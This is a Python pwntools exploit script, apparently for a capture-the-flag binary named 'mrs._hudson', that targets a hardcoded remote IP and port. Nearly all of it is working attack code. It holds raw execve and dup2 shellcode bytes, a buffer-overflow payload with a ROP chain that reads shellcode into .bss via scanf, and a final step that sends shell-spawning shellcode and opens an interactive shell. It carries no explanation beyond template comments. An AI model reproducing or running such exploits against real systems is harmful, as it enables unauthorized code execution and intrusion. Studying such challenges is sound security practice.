from pwn import *
from enert import *

# ==============================
# TODO:TEMPLATE FOR EXPLOITATION
# ==============================
context(os='linux', arch='amd64')
context.log_level = 'debug' # output verbose log
FILE_NAME   = './mrs._hudson'
#REMOTE_LIBC = './libc.so.6-hoge'
LOCAL_LIBC  = '/lib/x86_64-linux-gnu/libc.so.6'
REMOTE_HOST = "178.62.249.106"
REMOTE_PORT = 8642
LOCAL_HOST  = 'localhost'
LOCAL_PORT  = 4444
binary      = ELF(FILE_NAME)
r           = None
dflg        = 0
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(REMOTE_HOST, REMOTE_PORT)
    #libc = ELF(REMOTE_LIBC)
elif len(sys.argv) > 1 and sys.argv[1] == "l":
    r = process(FILE_NAME)
    libc = ELF(LOCAL_LIBC)
else:
    r = remote(LOCAL_HOST, LOCAL_PORT)
    libc = ELF(LOCAL_LIBC)

if len(sys.argv) > 1 and sys.argv[1] == "d":
    dflg = 1
if len(sys.argv) > 2 and sys.argv[2] == 'd':
    dflg = 1

def b():
    if dflg == 1:
        raw_input('break.')

sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_execve64 = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
sc_dup2execve32 = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
# =========================
# MAIN EXPLOITATION ROUTINE
# =========================
s_fmt = 0x40072b
pop_rdi = 0x004006f3
scanf = 0x400526 #plt next
pop_rsi_pop_r15 = 0x004006f1

bss = binary.bss()+0x800

buf = "A"*120
buf += p64(pop_rdi)
buf += p64(s_fmt)
buf += p64(pop_rsi_pop_r15)
buf += p64(bss)
buf += p64(s_fmt)
buf += p64(scanf)
buf += p64(bss)

b()
r.readuntil("Let's go back to 2000.\n")
r.sendline(buf)
r.sendline(asm(shellcraft.sh()))
r.interactive()
